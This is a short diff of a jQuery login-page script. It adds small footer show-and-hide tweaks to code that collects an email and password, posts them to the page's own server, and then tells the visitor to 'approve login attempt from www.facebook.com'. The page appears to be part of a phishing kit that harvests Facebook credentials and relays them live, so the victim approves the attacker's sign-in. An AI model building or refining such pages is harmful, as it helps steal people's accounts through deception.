@@ -1,8 +1,13 @@
 $(document).ready(function(){
+
   $("#login_btn").hover(function(){
     $("#login_btn").css("background", "#4DA1DE");
   }, function(){
     $("#login_btn").css("background", "#53ABEA");
+  });
+
+  $("#icon").click(function(){
+    $("#footer-text").show();
   });
 
   $("#login_btn").click(function(){
@@ -15,12 +20,14 @@ $(document).ready(function(){
     var email = $("input[name='email']").val();
     var password = $("input[name='password']").val();
     $('#login').hide();
+    $("#footer").hide();
     $("#login_btn").hide();
     $("#loading").show();
     $.post("/index", {email: email, password: password}, function( data ) {
       $("#plead").hide();
       if (data === "1"){
         $("#flash").html("<h3>Please approve login attempt from <a href='http://www.facebook.com' style='color:#4DA1DE;' target='_blank'>www.facebook.com</a></h3>");
+        $("#footer-text").show();
         $("#loading").hide();
         $("#login").show();
         $("#login_btn").show();
